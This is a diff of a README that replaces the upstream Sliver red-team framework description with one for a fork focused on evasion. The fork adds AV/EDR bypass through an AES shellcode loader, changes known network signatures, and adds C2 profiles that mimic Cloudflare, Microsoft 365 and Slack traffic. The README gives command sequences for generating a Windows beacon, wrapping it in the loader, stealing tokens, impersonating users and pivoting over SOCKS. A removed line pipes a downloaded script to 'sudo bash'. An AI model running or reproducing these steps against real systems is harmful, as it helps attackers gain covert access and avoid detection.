@@ -1,46 +1,158 @@
-# Sliver
+# mgstate/sliver — Enhanced Adversary Emulation Framework
 
-Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. Sliver's implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys.
+Enhanced fork of [BishopFox/sliver](https://github.com/BishopFox/sliver) with fixed SOCKS proxy, one-command RDP, reliable token impersonation, Harriet AV/EDR bypass integration, opsec C2 profiles, and network signature removal.
 
-The server and client support MacOS, Windows, and Linux. Implants are supported on MacOS, Windows, and Linux (and possibly every Golang compiler target but we've not tested them all).
+## What's New in This Fork
 
-[![Release](https://github.com/BishopFox/sliver/actions/workflows/autorelease.yml/badge.svg)](https://github.com/BishopFox/sliver/actions/workflows/autorelease.yml) [![Go Report Card](https://goreportcard.com/badge/github.com/BishopFox/sliver)](https://goreportcard.com/report/github.com/BishopFox/sliver) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
+### New Commands
+| Command | Description |
+|---------|-------------|
+| `rdp` | One-command RDP — auto port-forward + launches mstsc/xfreerdp |
+| `steal-token PID` | Steal token by PID — resolves process owner automatically |
+| `quick-impersonate` | Impersonate via creds (`-u/-p/-d`), PID (`-P`), or with exec (`-e`) |
+| `harriet` | Generate AES-encrypted, code-signed payloads via Harriet loader |
 
-Visit [https://sliver.sh/](https://sliver.sh/) for tutorials and documentation.
+### Fixed SOCKS Proxy (RDP/High-Bandwidth Works)
+Upstream SOCKS proxy was unusable for RDP and high-bandwidth protocols:
+- Removed 10ms sleep on every Read/Write/Close in implant tunnel handler
+- Buffers: 4KB→64KB (client), 100→512 (channels)
+- Rate limit: 10→50000 ops/s
+- Inactivity timeout: 15s→120s (RDP idles for minutes)
+- TCP keepalive + NoDelay on connections
+- Non-blocking send prevents deadlock on saturated tunnels
 
-### Features
+### Fixed Token Impersonation
+Upstream `impersonate` compared `proc.Owner()` (returns `"DOMAIN\username"`) with exact match — so `"admin"` never matched `"CORP\admin"`. Fixed with 3-tier matching: exact → case-insensitive → domain\user suffix.
 
-- Dynamic code generation
-- Compile-time obfuscation
-- Multiplayer-mode
-- Staged and Stageless payloads
-- [Procedurally generated C2](https://sliver.sh/docs?name=HTTPS+C2) over HTTP(S)
-- [DNS canary](https://sliver.sh/docs?name=DNS+C2) blue team detection
-- [Secure C2](https://sliver.sh/docs?name=Transport+Encryption) over mTLS, WireGuard, HTTP(S), and DNS
-- Fully scriptable using [Python](https://github.com/moloch--/sliver-py)
-- Windows process migration, process injection, user token manipulation, etc.
-- Let's Encrypt integration
-- In-memory .NET assembly execution
-- COFF/BOF in-memory loader
-- TCP and named pipe pivots
-- Much more!
+### Network Signature Removal
+Known Sliver network IOCs changed:
+- Yamux magic bytes: `"MUX/1"` → `"HSK/2"`
+- Envelope signing prefix: `"env-signing-v1:"` → `"tls-auth-seed:"`
 
-### Getting Started
+### Opsec C2 Profiles
+Pre-built HTTP traffic mimicry profiles in `opsec-profiles/`:
+- **cloudflare** — CDN static asset fetches (CF-RAY, CF-Cache-Status headers)
+- **microsoft365** — M365/Azure AD OAuth traffic (Edge UA, ESTS cookies)
+- **slack** — Slack Web API calls (conversations.history, chat.postMessage)
 
-Download the latest [release](https://github.com/BishopFox/sliver/releases) and see the Sliver [wiki](https://sliver.sh/docs?name=Getting+Started) for a quick tutorial on basic setup and usage. To get the very latest and greatest compile from source.
+### Harriet Integration
+Built-in command wraps shellcode with [Harriet](https://github.com/assume-breach/Home-Grown-Red-Team/tree/main/Harriet) AES-encrypted loader. 5 execution methods: `directsyscall`, `queueapc`, `nativeapi`, `inject`, `aes`. EXE or DLL output.
 
-#### Linux One Liner
+---
 
-`curl https://sliver.sh/install|sudo bash` and then run `sliver`
+## Quick Start
 
-### Help!
+### Automated Setup (Kali/Ubuntu)
+```bash
+git clone https://github.com/mgstate/sliver.git ~/sliver
+cd ~/sliver
+bash setup.sh
+```
 
-Please checkout the [wiki](https://sliver.sh/), or start a [GitHub discussion](https://github.com/BishopFox/sliver/discussions).
+This installs Go, MinGW, Harriet, builds Sliver, and creates helper scripts.
 
-### Compile From Source
+### Manual Build
+```bash
+# Prerequisites: Go 1.21+, MinGW (for Harriet)
+sudo apt install -y mingw-w64 osslsigncode python3-pycryptodome
+git clone https://github.com/mgstate/sliver.git ~/sliver
+cd ~/sliver && make
+```
 
-See the [wiki](https://sliver.sh/docs?name=Compile+from+Source).
+### Start Server
+```bash
+./sliver-server
+```
 
-### License - GPLv3
+### Import C2 Profiles
+```
+sliver > c2profiles import opsec-profiles/cloudflare-cdn-c2.json --name cloudflare
+sliver > c2profiles import opsec-profiles/microsoft365-c2.json --name microsoft365
+sliver > c2profiles import opsec-profiles/slack-api-c2.json --name slack
+```
 
-Sliver is licensed under [GPLv3](https://www.gnu.org/licenses/gpl-3.0.en.html), some sub-components may have separate licenses. See their respective subdirectories in this project for details.
+### Start Listeners
+```
+sliver > mtls -l 0.0.0.0 -p 8888
+sliver > https -l 0.0.0.0 -p 443 -d cdn.yourdomain.com
+```
+
+### Generate Implant
+```
+sliver > generate beacon \
+  --mtls YOUR_IP:8888 \
+  --http https://cdn.yourdomain.com \
+  --os windows --arch amd64 \
+  --format shellcode --evasion \
+  --c2profile cloudflare \
+  --seconds 60 --jitter 30 \
+  --strategy r --save /tmp/beacon.bin
+```
+
+### Wrap with Harriet
+```
+sliver > harriet \
+  --shellcode /tmp/beacon.bin \
+  --method directsyscall \
+  --format exe \
+  --output /tmp/implant.exe \
+  --harriet-path /opt/Home-Grown-Red-Team/Harriet
+```
+
+### Post-Exploitation
+```
+sliver (IMPLANT) > steal-token 1234              # Steal token by PID
+sliver (IMPLANT) > quick-impersonate -u admin -p Pass -d CORP -e "whoami /all"
+sliver (IMPLANT) > rdp -u admin -p Pass           # One-command RDP
+sliver (IMPLANT) > socks5 start -p 1080           # SOCKS proxy (RDP works)
+sliver (IMPLANT) > rev2self                        # Revert impersonation
+```
+
+---
+
+## Documentation
+
+| Guide | Description |
+|-------|-------------|
+| [OPSEC-GUIDE.md](OPSEC-GUIDE.md) | Full step-by-step: build, profiles, listeners, implant generation, Harriet wrapping, deployment, post-exploitation, cleanup |
+| [AZURE-KILLCHAIN.md](AZURE-KILLCHAIN.md) | Azure RunCommand lateral movement kill chain — proven engagement guide with Meatball C2 + Sliver C2 |
+
+## Helper Scripts
+
+| Script | Description |
+|--------|-------------|
+| `setup.sh` | Automated setup — installs deps, builds Sliver, sets up Harriet |
+| `start.sh` | Generated by setup — launches server with profile import hints |
+| `gen-implant.sh` | Generated by setup — one-command beacon + Harriet wrapping |
+| `deploy-runcommand.sh` | Generated by setup — deploys implant to Azure VM via RunCommand v2 |
+
+---
+
+## Files Changed From Upstream
+
+```
+client/command/harriet/               # NEW — Harriet integration
+client/command/rdp/                   # NEW — One-command RDP
+client/command/privilege/steal-token.go    # REWRITTEN — PID-based token theft
+client/command/privilege/quick-impersonate.go  # NEW — Enhanced impersonation
+client/core/socks.go                  # FIXED — 64KB buffer, 50k rate limit
+implant/sliver/handlers/tunnel_handlers/socks_handler.go  # FIXED — Sleep removal
+implant/sliver/priv/priv_windows.go   # FIXED — 3-tier impersonation matching
+implant/sliver/transports/mtls/mtls.go  # CHANGED — Network signatures
+server/c2/mtls.go                     # CHANGED — Matching server signatures
+server/rpc/rpc-socks.go              # TUNED — Buffer/timeout for high-bandwidth
+opsec-profiles/                       # NEW — 3 C2 traffic profiles
+setup.sh                              # NEW — Automated setup script
+```
+
+---
+
+## Upstream
+
+Based on [BishopFox/sliver](https://github.com/BishopFox/sliver) — open source adversary emulation framework. C2 over mTLS, WireGuard, HTTP(S), and DNS. Dynamic code generation, compile-time obfuscation, in-memory .NET assembly execution, COFF/BOF loader, TCP/named pipe pivots.
+
+See the upstream [wiki](https://sliver.sh/) for base Sliver documentation.
+
+### License — GPLv3
+
+Sliver is licensed under [GPLv3](https://www.gnu.org/licenses/gpl-3.0.en.html). Some sub-components may have separate licenses.
